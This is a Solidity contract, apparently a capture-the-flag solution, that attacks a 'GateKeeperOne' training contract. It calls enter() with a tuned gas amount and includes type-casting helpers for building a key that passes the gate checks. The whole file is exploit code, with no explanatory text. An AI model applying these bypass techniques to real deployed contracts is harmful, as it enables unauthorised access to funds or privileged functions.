// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';
import './GateKeeperOne.sol';

contract HackGateOne {

  using SafeMath for uint256;
  address public gatekoadd;
  GateKeeperOne public gateko;
  event Fail(bytes data);

  constructor(address _gatekoadd) public {
    gatekoadd = _gatekoadd;
    gateko = GateKeeperOne(gatekoadd);
  }

  function hack(bytes32 _gateKey) public {
    (bool result, bytes memory data) = gatekoadd.call.value(0 ether).gas(1065084)(abi.encodeWithSignature("enter(bytes8)", bytes8(_gateKey)));
    emit Fail(data);
  }

  function get8(bytes32 _gateKey) view public returns (bytes8) {
      return bytes8(_gateKey);
  }

  function get16(uint64 _gateKey) view public returns (uint16) {
      return uint16(_gateKey);
  }

  function get16add(address _gateKey) view public returns (uint16) {
      return uint16(_gateKey);
  }

  function get32(uint64 _gateKey) view public returns (uint32) {
      return uint32(_gateKey);
  }

  function get64(bytes8 _gateKey) view public returns (uint64) {
      return uint64(_gateKey);
  }

  function get_bytes_from_64(uint64 _gateKey) view public returns (bytes8) {
      return bytes8(_gateKey);
  }

}